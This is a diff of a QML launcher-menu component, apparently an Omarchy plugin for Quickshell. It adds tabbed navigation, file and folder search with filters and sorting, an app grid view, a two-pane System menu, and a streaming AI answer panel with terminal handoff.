+  }
+
+  // The paced "typewriter" reveal; runs only while an answer is streaming.
+  Timer {
+    id: aiDrainTimer
+    interval: Math.max(8, root.aiStreamFlushMs)
+    repeat: true
+    running: !!(root.aiSession && (root.aiSession.state === "running" || root.aiSession.state === "draining"))
+    onTriggered: {
+      var snap = AiBackend.tick()
+      if (snap) root.aiSession = snap
+    }
+  }
+
+  Process {
+    id: aiHandoffProcess
+    property bool handled: true
+    property int attempt: 0
+    property var resumeArgv: null
+    stderr: StdioCollector { id: aiHandoffStderr; waitForEnd: false }
+    onExited: function(exitCode) {
+      var alreadyHandled = aiHandoffProcess.handled
+      aiHandoffProcess.handled = true
+      aiHandoffGrace.stop()
+      var superseded = aiHandoffProcess.attempt !== root.aiHandoffAttempt
+      if (exitCode === 0) {
+        if (!alreadyHandled && !superseded) root.aiDismiss()
+        return
+      }
+      console.warn("[omarchy-menu-omni/ai] terminal handoff failed (exit " + exitCode + "): " + (aiHandoffStderr.text || "(no stderr)"))
+      if (superseded) return
+      if (!alreadyHandled) {
+        root.aiHandoffError = "Could not open a terminal — try again or check your default terminal setup"
+        var snap = AiBackend.cancelHandoff()
+        if (snap) root.aiSession = snap
+      } else if (aiHandoffProcess.resumeArgv) {
+        Quickshell.execDetached(["notify-send", "Menu AI",
+          "Terminal failed to open — resume manually: " + aiHandoffProcess.resumeArgv.join(" ")])
+      }
+    }
+  }
+
+  // Still running after the grace window: the terminal launched.
+  Timer {
+    id: aiHandoffGrace
+    interval: 400
+    onTriggered: {
+      if (aiHandoffProcess.handled) return
+      aiHandoffProcess.handled = true
+      if (aiHandoffProcess.attempt !== root.aiHandoffAttempt) return
+      root.aiDismiss(true)
+    }
+  }
+
+  Timer {
+    id: fileDebounce
+    interval: 200
+    onTriggered: root.runFileSearch()
+  }
+
+  Process {
+    id: dirSearchProc
+    property int gen: 0
+    property string key: ""
+    stdout: StdioCollector { id: dirSearchOut; waitForEnd: true }
+    onExited: root.fileSearchFinished(dirSearchProc, dirSearchOut.text || "", true)
+  }
+
+  Process {
+    id: fileSearchProc
+    property int gen: 0
+    property string key: ""
+    stdout: StdioCollector { id: fileSearchOut; waitForEnd: true }
+    onExited: root.fileSearchFinished(fileSearchProc, fileSearchOut.text || "", false)
+  }
+
+  Process {
+    id: statProc
+    property int gen: 0
+    stdout: StdioCollector { id: statOut; waitForEnd: true }
+    onExited: {
+      if (statProc.gen === root.fileSearchGen) root.applyFileMtimes(FileSearch.parseStatLines(statOut.text || ""))
+      else root.fetchFileMtimes()
+    }
+  }
+
   // ----------------------------------------------------------- route surface
   //
   // The menu is opened through the standard plugin lifecycle:
@@ -1836,8 +3212,23 @@ Item {
     }
     // If it's a link (a redirect to another menu), follow the link.
     if (entry && entry.kind === "link" && entry.target) id = entry.target
-    root.pendingInitialMenu = id
-    root.openExistingMenu(id)
+    var place = Tabs.tabForRoute(id)
+    root.loadAiConfig()
+    root.loadStyle()
+    root.loadState()
+    if (place.tab === "all" && !root.tabEnabled("all"))
+      place = { tab: Tabs.firstEnabledTab(root.tabOrder, root.disabledTabs), menu: "root" }
+    root.activeTab = place.tab
+    // Type filters start over with each open, as in omarchy-find; the sort
+    // mode and the result limit are preferences and stay.
+    root.fileFilterIndex = 0
+    root.folderFilterIndex = 0
+    root.pendingInitialMenu = place.menu
+    root.openExistingMenu(place.menu)
+    root.systemPane = place.menu === "root" ? "left" : "right"
+    if (place.tab === "system") Qt.callLater(root.enterSystemPanes)
+    if (place.tab === "apps") root.loadProviderForMenu("apps")
+    root.requestFileSearch()
     return "ok"
   }
 
@@ -2197,7 +3588,13 @@ Item {
     property int cardTop: -1
     property int maxRowsHeight: -1
     readonly property int centeredTop: Math.max(Style.gapsOut, Math.round((height - root.cardHeight) / 2))
-    readonly property int effectiveCardTop: cardTop >= 0 ? cardTop : centeredTop
+    // The launcher opens at a fixed line near the top, Spotlight-style, so
+    // growing from the compact prompt into a full card only ever extends
+    // downward. A dmenu picker keeps the centered, freeze-on-type behaviour.
+    readonly property int launcherTop: Math.round(height * root.launcherTopFraction)
+    readonly property int effectiveCardTop: root.tabsActive && root.launcherTopFraction >= 0
+      ? launcherTop
+      : (cardTop >= 0 ? cardTop : centeredTop)
     function freezeCardTop() {
       if (visible && cardTop < 0) {
         cardTop = effectiveCardTop
@@ -2242,7 +3639,84 @@ Item {
             return
           }
 
-          if (event.key === Qt.Key_Delete) {
+          if (root.isAiMode && (event.key === Qt.Key_Tab || event.key === Qt.Key_Backtab)) {
+            // In AI mode the bar holds agents, not tabs.
+            root.cycleAiAgent(event.key === Qt.Key_Backtab || (event.modifiers & Qt.ShiftModifier) ? -1 : 1)
+            event.accepted = true
+          } else if (root.isAiMode && (event.modifiers & Qt.ControlModifier)
+                     && event.key >= Qt.Key_1 && event.key < Qt.Key_1 + root.aiAgents.length) {
+            root.setAiAgent(root.aiAgents[event.key - Qt.Key_1])
+            event.accepted = true
+          } else if (root.tabsActive && (event.key === Qt.Key_Tab || event.key === Qt.Key_Backtab)) {
+            // Claimed before anything else: left alone, Tab moves QML focus
+            // off the key catcher and the menu stops hearing the keyboard.
+            var back = event.key === Qt.Key_Backtab || (event.modifiers & Qt.ShiftModifier)
+            root.setTab(Tabs.cycleTab(root.activeTab, back ? -1 : 1, root.orderedTabs))
+            event.accepted = true
+          } else if (root.tabsActive && (event.modifiers & Qt.ControlModifier)
+                     && event.key >= Qt.Key_1 && event.key < Qt.Key_1 + root.orderedTabs.length) {
+            root.setTab(root.orderedTabs[event.key - Qt.Key_1].id)
+            event.accepted = true
+          } else if (root.systemTwoPane && root.systemMatches.length > 0
+                     && (event.modifiers & Qt.ControlModifier) && (event.key === Qt.Key_Up || event.key === Qt.Key_Down)) {
+            root.jumpToSystemMatch(root.systemMatchIndex + (event.key === Qt.Key_Down ? 1 : -1))
+            event.accepted = true
+          } else if (root.systemTwoPane && root.systemPane === "left"
+                     && (event.key === Qt.Key_Up || event.key === Qt.Key_Down
+                         || event.key === Qt.Key_Right || event.key === Qt.Key_Return || event.key === Qt.Key_Enter)) {
+            if (event.key === Qt.Key_Up || event.key === Qt.Key_Down) {
+              var n = root.systemCategories.length
+              if (n > 0) root.selectSystemCategory((root.systemCategoryIndex + (event.key === Qt.Key_Down ? 1 : -1) + n) % n)
+            } else {
+              root.activateSystemCategory()
+            }
+            event.accepted = true
+          } else if (root.systemTwoPane && root.systemPane === "right"
+                     && (event.key === Qt.Key_Left || (event.key === Qt.Key_Backspace && !root.filterText))) {
+            root.systemBack()
+            event.accepted = true
+          } else if (root.isAiMode && (event.key === Qt.Key_Return || event.key === Qt.Key_Enter)) {
+            if (!event.isAutoRepeat) {
+              var aiState = root.aiSession ? root.aiSession.state : "idle"
+              if (aiState === "idle" || aiState === "error") root.aiSubmit()
+              else if (aiState === "ready") root.aiHandoff()
+            }
+            event.accepted = true
+          } else if (root.isAiMode && event.key === Qt.Key_C && event.modifiers === Qt.ControlModifier) {
+            root.aiCopyAnswer()
+            event.accepted = true
+          } else if (root.isAiMode && (event.key === Qt.Key_Up || event.key === Qt.Key_Down
+                     || event.key === Qt.Key_PageUp || event.key === Qt.Key_PageDown)) {
+            var step = (event.key === Qt.Key_PageUp || event.key === Qt.Key_PageDown)
+              ? aiAnswerFlick.height : root.aiLineHeight * 2
+            var maxY = Math.max(0, aiAnswerFlick.contentHeight - aiAnswerFlick.height)
+            var down = event.key === Qt.Key_Down || event.key === Qt.Key_PageDown
+            aiAnswerFlick.contentY = down ? Math.min(maxY, aiAnswerFlick.contentY + step)
+                                          : Math.max(0, aiAnswerFlick.contentY - step)
+            aiAnswerFlick.pinnedToBottom = aiAnswerFlick.contentY >= maxY - 4
+            event.accepted = true
+          } else if ((event.key === Qt.Key_Return || event.key === Qt.Key_Enter)
+                     && (event.modifiers & Qt.AltModifier) && root.selectedFileRow()) {
+            root.openEnclosingFolder(root.selectedFileRow())
+            event.accepted = true
+          } else if (event.key === Qt.Key_C && event.modifiers === Qt.ControlModifier && root.selectedFileRow()) {
+            root.copyPath(root.selectedFileRow())
+            event.accepted = true
+          } else if (event.key === Qt.Key_T && event.modifiers === Qt.ControlModifier && root.selectedFileRow()) {
+            root.openTerminalAt(root.selectedFileRow())
+            event.accepted = true
+          } else if ((root.activeTab === "files" || root.activeTab === "folders") && root.tabsActive
+                     && event.modifiers === Qt.ControlModifier
+                     && (event.key === Qt.Key_F || event.key === Qt.Key_S || event.key === Qt.Key_L)) {
+            if (event.key === Qt.Key_F) root.cycleFileFilter()
+            else {
+              if (event.key === Qt.Key_S) root.fileSortMode = FileSearch.nextSortMode(root.fileSortMode)
+              else root.fileDisplayLimit = FileSearch.nextDisplayLimit(root.fileDisplayLimit)
+              root.selectedIndex = 0
+              root.rebuildDisplay()
+            }
+            event.accepted = true
+          } else if (event.key === Qt.Key_Delete) {
             root.requestDeleteSelected()
             event.accepted = true
           } else if (event.key === Qt.Key_Escape) {
@@ -2267,8 +3741,19 @@ Item {
           } else if (Util.editsFilter(event, root.filterText)) {
             root.setFilter(Util.editedFilter(event, root.filterText))
             event.accepted = true
+          } else if (root.tabsActive && root.activeTab === "apps" && event.key === Qt.Key_G
+                     && event.modifiers === Qt.ControlModifier) {
+            root.toggleAppsView()
+            event.accepted = true
+          } else if (root.gridActive && (event.key === Qt.Key_Left || event.key === Qt.Key_Right
+                     || event.key === Qt.Key_Up || event.key === Qt.Key_Down)) {
+            var cols = appGrid.columns
+            root.gridMove(event.key === Qt.Key_Left ? -1 : event.key === Qt.Key_Right ? 1
+                          : event.key === Qt.Key_Up ? -cols : cols)
+            event.accepted = true
           } else if ((event.key === Qt.Key_Backspace || event.key === Qt.Key_Left) && !root.filterText) {
-            root.goBack()
+            // Only System has submenus to back out of.
+            if (!root.tabsActive || root.activeTab === "system") root.goBack()
             event.accepted = true
           } else if (event.key === Qt.Key_Up) {
             root.select(-1)
@@ -2330,13 +3815,55 @@ Item {
           color: "transparent"
 
           Text {
+            id: viewToggle
             textFormat: Text.PlainText
-            anchors.left: parent.left
+            visible: root.tabsActive && root.activeTab === "apps"
+            text: root.appsView === "grid" ? "󰕰" : "󰈚"
+            color: root.foreground
+            opacity: viewToggleMouse.containsMouse ? 0.9 : 0.5
+            font.family: root.fontFamily
+            font.pixelSize: root.scaledFont(Style.font.iconLarge)
             anchors.right: parent.right
+            anchors.rightMargin: Style.space(4)
+            anchors.verticalCenter: parent.verticalCenter
+
+            MouseArea {
+              id: viewToggleMouse
+              anchors.fill: parent
+              anchors.margins: -Style.space(6)
+              hoverEnabled: true
+              cursorShape: Qt.PointingHandCursor
+              onClicked: {
+                root.toggleAppsView()
+                Qt.callLater(function() { keyCatcher.forceActiveFocus() })
+              }
+            }
+          }
+
+          Text {
+            id: searchGlyph
+            textFormat: Text.PlainText
+            visible: root.tabsActive
+            text: "󰍉"
+            color: root.foreground
+            opacity: 0.6
+            font.family: root.fontFamily
+            font.pixelSize: root.scaledFont(Style.font.iconLarge)
+            anchors.left: parent.left
+            anchors.leftMargin: Style.space(4)
+            anchors.verticalCenter: parent.verticalCenter
+          }
+
+          Text {
+            textFormat: Text.PlainText
+            anchors.left: root.tabsActive ? searchGlyph.right : parent.left
+            anchors.leftMargin: root.tabsActive ? Style.space(10) : 0
+            anchors.right: viewToggle.visible ? viewToggle.left : parent.right
+            anchors.rightMargin: viewToggle.visible ? Style.space(8) : 0
             anchors.verticalCenter: parent.verticalCenter
             // Bounded like the rows: the prompt comes from whoever invoked
             // the dmenu, and the title from the JSONC.
-            text: MenuModel.sanitizeText(root.filterText || (root.dmenuActive ? (root.dmenuPrompt + "…") : ((root.item(root.activeMenu) ? (root.item(root.activeMenu).title || root.item(root.activeMenu).label) : "Go") + "…")))
+            text: MenuModel.sanitizeText(root.filterText || root.promptText())
             color: root.foreground
             opacity: root.filterText ? 1 : 0.58
             font.family: root.fontFamily
@@ -2346,13 +3873,326 @@ Item {
 
         }
 
+        TabBar {
+          id: tabBar
+          visible: root.tabsActive
+          height: visible ? implicitHeight : 0
+          tabs: root.isAiMode ? root.aiAgentTabs : root.orderedTabs
+          activeTab: root.isAiMode ? root.aiAgent : root.activeTab
+          fontFamily: root.fontFamily
+          foreground: root.foreground
+          accent: Color.accent
+          fontSize: root.scaledFont(Style.font.body)
+          onTabClicked: function(id) {
+            if (root.isAiMode) root.setAiAgent(id)
+            else root.setTab(id)
+            Qt.callLater(function() { keyCatcher.forceActiveFocus() })
+          }
+        }
+
+        Item {
+          id: fileBar
+          visible: root.tabsActive && !root.isAiMode && (root.activeTab === "files" || root.activeTab === "folders")
+          width: parent.width
+          height: visible ? fileFilterChips.implicitHeight : 0
+
+          TabBar {
+            id: fileFilterChips
+            anchors.left: parent.left
+            width: parent.width - fileSortLabel.implicitWidth - Style.space(12)
+            tabs: FileSearch.filtersFor(root.activeTab).map(function(f) { return { id: f.id, label: f.label, icon: "" } })
+            activeTab: root.fileFilterFor(root.activeTab).id
+            fontFamily: root.fontFamily
+            foreground: root.foreground
+            accent: Color.accent
+            fontSize: root.scaledFont(Style.font.caption)
+            onTabClicked: function(id) {
+              root.setFileFilter(id)
+              Qt.callLater(function() { keyCatcher.forceActiveFocus() })
+            }
+          }
+
+          Text {
+            id: fileSortLabel
+            textFormat: Text.PlainText
+            anchors.right: parent.right
+            anchors.top: parent.top
+            text: (root.fileSearching ? "searching… · " : "")
+              + FileSearch.sortMode(root.fileSortMode).icon + " " + FileSearch.sortMode(root.fileSortMode).label
+              + " · " + displayModel.count + "/" + root.fileDisplayLimit
+            color: root.foreground
+            opacity: 0.5
+            font.family: root.fontFamily
+            font.pixelSize: root.scaledFont(Style.font.caption)
+          }
+        }
+
         Item {
           width: parent.width
           height: root.visibleRowsHeight
+          visible: height > 0
+
+          Item {
+            id: aiPanel
+            anchors.fill: parent
+            visible: root.isAiMode
+
+            Rectangle {
+              id: aiChip
+              height: aiChipLabel.implicitHeight + Style.space(10)
+              width: aiChipLabel.implicitWidth + Style.space(18)
+              radius: height / 2
+              color: root.aiSession && root.aiSession.state === "error" ? Util.alpha(Color.urgent, 0.18) : Util.alpha(Color.accent, 0.22)
+
+              Text {
+                id: aiChipLabel
+                anchors.centerIn: parent
+                textFormat: Text.PlainText
+                text: root.aiChipText()
+                color: root.aiSession && root.aiSession.state === "error" ? Color.urgent : Color.accent
+                font.family: root.fontFamily
+                font.pixelSize: root.scaledFont(Style.font.body)
+              }
+            }
+
+            Text {
+              visible: root.aiConfigWarning !== ""
+              anchors.left: aiChip.right
+              anchors.leftMargin: Style.space(8)
+              anchors.right: parent.right
+              anchors.verticalCenter: aiChip.verticalCenter
+              textFormat: Text.PlainText
+              text: root.aiConfigWarning
+              color: root.foreground
+              opacity: 0.55
+              elide: Text.ElideRight
+              font.family: root.fontFamily
+              font.pixelSize: root.scaledFont(Style.font.caption)
+            }
+
+            Rectangle {
+              id: aiAnswerBox
+              anchors.top: aiChip.bottom
+              anchors.topMargin: root.contentSpacing
+              anchors.left: parent.left
+              anchors.right: parent.right
+              anchors.bottom: aiFooter.top
+              anchors.bottomMargin: root.contentSpacing
+              radius: root.cornerRadius
+              color: Util.alpha(root.foreground, 0.05)
+              visible: !!root.aiSession && root.aiSession.state !== "idle"
+
+              Flickable {
+                id: aiAnswerFlick
+                anchors.fill: parent
+                anchors.margins: Style.space(10)
+                clip: true
+                contentWidth: width
+                contentHeight: aiAnswerText.implicitHeight
+                boundsBehavior: Flickable.StopAtBounds
+                property bool pinnedToBottom: true
+
+                onContentHeightChanged: {
+                  if (aiAnswerFlick.pinnedToBottom)
+                    aiAnswerFlick.contentY = Math.max(0, aiAnswerFlick.contentHeight - aiAnswerFlick.height)
+                }
+                onMovementEnded: {
+                  aiAnswerFlick.pinnedToBottom = aiAnswerFlick.contentY >= (aiAnswerFlick.contentHeight - aiAnswerFlick.height - 4)
+                }
+
+                Text {
+                  id: aiAnswerText
+                  width: aiAnswerFlick.width
+                  text: {
+                    var s = root.aiSession
+                    if (!s) return ""
+                    if (s.state !== "error") return root.aiRenderable(s.displayedText)
+                    var msg = root.aiRenderable(s.errorMessage || "")
+                    return s.displayedText && s.displayedText.length > 0
+                      ? root.aiRenderable(s.displayedText) + "\n\n⚠ " + msg
+                      : msg
+                  }
+                  textFormat: Text.MarkdownText
+                  onLinkActivated: function(link) { root.aiOpenLink(link) }
+                  wrapMode: Text.Wrap
+                  color: (root.aiSession && root.aiSession.state === "error"
+                          && (!root.aiSession.displayedText || root.aiSession.displayedText.length === 0))
+                    ? Color.urgent : root.foreground
+                  font.family: root.fontFamily
+                  font.pixelSize: root.scaledFont(Style.font.body)
+                }
+              }
+            }
+
+            Text {
+              id: aiFooter
+              anchors.left: parent.left
+              anchors.right: parent.right
+              anchors.bottom: parent.bottom
+              textFormat: Text.PlainText
+              text: root.aiFooterText()
+              color: root.foreground
+              opacity: 0.5
+              wrapMode: Text.Wrap
+              font.family: root.fontFamily
+              font.pixelSize: root.scaledFont(Style.font.caption)
+            }
+          }
+
+          AppGrid {
+            id: appGrid
+            menu: root
+            // As wide as the whole columns that fit, and centred: the leftover
+            // part of a column sits evenly on both sides instead of all at the
+            // right edge.
+            anchors.top: parent.top
+            anchors.bottom: parent.bottom
+            anchors.horizontalCenter: parent.horizontalCenter
+            width: Math.max(cellWidth, Math.floor(parent.width / cellWidth) * cellWidth)
+            visible: root.gridActive && !root.isAiMode
+            model: root.gridActive ? displayModel : null
+          }
+
+          // System's left pane: the top-level categories.
+          ListView {
+            id: systemCategoryList
+            visible: root.systemTwoPane
+            width: visible ? Math.round(parent.width * 0.34) : 0
+            anchors.top: parent.top
+            anchors.bottom: parent.bottom
+            anchors.left: parent.left
+            clip: true
+            spacing: root.rowSpacing
+            boundsBehavior: Flickable.StopAtBounds
+            model: root.systemCategories
+            currentIndex: root.systemCategoryIndex
+
+            delegate: BorderSurface {
+              id: category
+              required property var modelData
+              required property int index
+              readonly property bool picked: category.index === root.systemCategoryIndex
+              readonly property bool focusedHere: category.picked && root.systemPane === "left"
+
+              width: ListView.view.width
+              height: root.baseRowHeight
+              radius: root.cornerRadius
+              color: category.focusedHere ? root.selectedBackground
+                : (category.picked ? Util.alpha(root.foreground, 0.08) : "transparent")
+              borderSpec: category.focusedHere ? root.selectedBorderSpec : Border.none()
+
+              Text {
+                id: categoryIcon
+                textFormat: Text.PlainText
+                text: category.modelData.icon
+                color: category.focusedHere ? root.selectedText : (category.picked ? Color.accent : root.foreground)
+                font.family: category.modelData.iconFont || root.fontFamily
+                font.pixelSize: root.scaledFont(Style.font.iconLarge)
+                width: root.iconSlotWidth
+                horizontalAlignment: Text.AlignHCenter
+                anchors.left: parent.left
+                anchors.leftMargin: Style.space(6)
+                anchors.verticalCenter: parent.verticalCenter
+              }
+
+              Text {
+                textFormat: Text.PlainText
+                text: category.modelData.label
+                color: category.focusedHere ? root.selectedText : root.foreground
+                opacity: category.picked ? 1 : 0.8
+                font.family: root.fontFamily
+                font.pixelSize: root.scaledFont(Style.font.heading)
+                font.weight: category.picked ? Font.DemiBold : Font.Normal
+                elide: Text.ElideRight
+                anchors.left: categoryIcon.right
+                anchors.leftMargin: Style.space(6)
+                anchors.right: categoryChevron.left
+                anchors.verticalCenter: parent.verticalCenter
+              }
+
+              Text {
+                id: categoryChevron
+                textFormat: Text.PlainText
+                text: category.modelData.kind === "menu" || category.modelData.kind === "link" ? "›" : ""
+                color: root.foreground
+                opacity: category.picked ? 0.6 : 0.3
+                font.family: root.fontFamily
+                font.pixelSize: root.scaledFont(Style.font.heading)
+                anchors.right: parent.right
+                anchors.rightMargin: Style.space(10)
+                anchors.verticalCenter: parent.verticalCenter
+              }
+
+              MouseArea {
+                anchors.fill: parent
+                hoverEnabled: true
+                cursorShape: Qt.PointingHandCursor
+                onClicked: {
+                  if (category.picked) root.activateSystemCategory()
+                  else root.selectSystemCategory(category.index)
+                }
+              }
+            }
+          }
+
+          Rectangle {
+            id: systemPaneDivider
+            visible: root.systemTwoPane
+            width: visible ? Style.spacing.hairline : 0
+            anchors.top: parent.top
+            anchors.bottom: parent.bottom
+            anchors.left: systemCategoryList.right
+            anchors.leftMargin: visible ? Style.space(8) : 0
+            color: Util.alpha(root.foreground, 0.15)
+          }
+
+          // A category that is an action (About) has nothing to preview.
+          Text {
+            visible: root.systemTwoPane && displayModel.count === 0
+            anchors.centerIn: resultList
+            textFormat: Text.PlainText
+            text: "Enter to open"
+            color: root.foreground
+            opacity: 0.45
+            font.family: root.fontFamily
+            font.pixelSize: root.scaledFont(Style.font.body)
+          }
+
+          // Right pane heading: where in the menu the list below is.
+          Text {
+            id: systemPaneTitle
+            visible: root.systemTwoPane
+            // Fixed from the font rather than implicitHeight: an elided Text's
+            // implicit height depends on its own size, a binding loop.
+            height: visible ? root.scaledFont(Style.font.caption) + Style.space(12) : 0
+            verticalAlignment: Text.AlignTop
+            anchors.top: parent.top
+            anchors.left: systemPaneDivider.right
+            anchors.leftMargin: visible ? Style.space(12) : 0
+            anchors.right: parent.right
+            textFormat: Text.PlainText
+            text: (root.activeMenu === "root" ? "" : MenuModel.sanitizeText(root.pathFor(root.activeMenu)).toUpperCase())
+              + (root.systemMatches.length > 0
+                 ? "   ·   MATCH " + (root.systemMatchIndex + 1) + "/" + root.systemMatches.length
+                   + (root.systemMatches.length > 1 ? "  CTRL+↑↓" : "")
+                 : "")
+            color: root.foreground
+            opacity: 0.45
+            elide: Text.ElideLeft
+            font.family: root.fontFamily
+            font.pixelSize: root.scaledFont(Style.font.caption)
+            font.weight: Font.DemiBold
+            font.letterSpacing: 1
+          }
 
           ListView {
             id: resultList
-            anchors.fill: parent
+            anchors.top: systemPaneTitle.bottom
+            anchors.bottom: parent.bottom
+            anchors.left: systemPaneDivider.right
+            anchors.leftMargin: root.systemTwoPane ? Style.space(8) : 0
+            anchors.right: parent.right
+            visible: !root.gridActive && !root.isAiMode
             model: displayModel
             clip: true
             spacing: root.rowSpacing
@@ -2362,12 +4202,30 @@ Item {
             section.criteria: ViewSection.FullString
             section.delegate: Item {
               required property string section
+              readonly property bool isHeader: Tabs.isHeaderSection(section)
 
               width: ListView.view.width
-              height: section === "drilldown" ? root.dividerHeight : 0
-              visible: section === "drilldown"
+              height: section === "drilldown" ? root.dividerHeight : (isHeader ? root.sectionHeaderHeight : 0)
+              visible: section === "drilldown" || isHeader
+
+              Text {
+                visible: parent.isHeader
+                textFormat: Text.PlainText
+                text: Tabs.headerTitle(parent.section).toUpperCase()
+                color: root.foreground
+                opacity: 0.45
+                font.family: root.fontFamily
+                font.pixelSize: root.scaledFont(Style.font.caption)
+                font.weight: Font.DemiBold
+                font.letterSpacing: 1
+                anchors.left: parent.left
+                anchors.leftMargin: root.rowReservedBorderLeft + Style.space(10)
+                anchors.bottom: parent.bottom
+                anchors.bottomMargin: Style.space(4)
+              }
 
               Rectangle {
+                visible: parent.section === "drilldown"
                 anchors.left: parent.left
                 anchors.leftMargin: Style.space(4)
                 anchors.right: parent.right
@@ -2393,8 +4251,10 @@ Item {
               required property string path
               required property string action
               required property int childCount
+              required property string trailText
 
               readonly property bool hasCursor: root.cursorActive && row.index === root.selectedIndex
+                && (!root.systemTwoPane || root.systemPane === "right")
               readonly property bool isApp: row.kind === "app"
               readonly property bool hasIcon: row.icon.length > 0 || row.isApp
 
@@ -2452,7 +4312,7 @@ Item {
                 id: contentColumn
                 anchors.left: row.hasIcon ? iconText.right : parent.left
                 anchors.leftMargin: row.hasIcon ? Style.space(6) : root.rowReservedBorderLeft + Style.space(18)
-                anchors.right: trail.left
+                anchors.right: trailLabel.visible ? trailLabel.left : trail.left
                 anchors.rightMargin: Style.space(6)
                 anchors.verticalCenter: parent.verticalCenter
                 spacing: Style.space(3)
@@ -2473,13 +4333,27 @@ Item {
                   textFormat: Text.PlainText
                   width: parent.width
                   text: row.detail
-                  visible: (root.filterText || row.kind === "dmenu") && row.detail.length > 0
+                  visible: root.showsDetail(row.kind, row.detail)
                   color: root.foreground
                   opacity: 0.52
                   font.family: root.fontFamily
                   font.pixelSize: root.scaledFont(Style.font.bodySmall)
                   elide: Text.ElideRight
                 }
+              }
+
+              Text {
+                id: trailLabel
+                textFormat: Text.PlainText
+                visible: row.trailText.length > 0
+                text: row.trailText
+                color: row.hasCursor ? root.selectedText : root.foreground
+                opacity: 0.45
+                font.family: root.fontFamily
+                font.pixelSize: root.scaledFont(Style.font.bodySmall)
+                anchors.right: trail.left
+                anchors.rightMargin: Style.space(6)
+                anchors.verticalCenter: parent.verticalCenter
               }
 
               Row {
@@ -2573,7 +4447,7 @@ Item {
           Column {
             anchors.centerIn: parent
             spacing: Style.space(8)
-            visible: displayModel.count === 0 && root.mode !== "input"
+            visible: displayModel.count === 0 && root.mode !== "input" && !root.isAiMode && !root.systemTwoPane
 
             Text {
               textFormat: Text.PlainText
@@ -2588,7 +4462,8 @@ Item {
 
             Text {
               textFormat: Text.PlainText
-              text: root.filterText ? "No matches for “" + root.filterText + "”" : "Nothing here yet"
+              text: root.fileSearching ? "Searching…"
+                : (root.filterText ? "No matches for “" + root.filterText + "”" : "Nothing here yet")
               color: root.foreground
               opacity: 0.7
               font.family: root.fontFamily
@@ -2599,9 +4474,18 @@ Item {
           }
         }
 
-        Item {
+        Text {
+          id: footer
+          visible: root.tabsActive && !root.compact && !root.isAiMode
           width: parent.width
-          height: 0
+          textFormat: Text.PlainText
+          text: root.footerHints()
+          color: root.foreground
+          opacity: 0.4
+          horizontalAlignment: Text.AlignHCenter
+          wrapMode: Text.Wrap
+          font.family: root.fontFamily
+          font.pixelSize: root.scaledFont(Style.font.caption)
         }
       }
     }
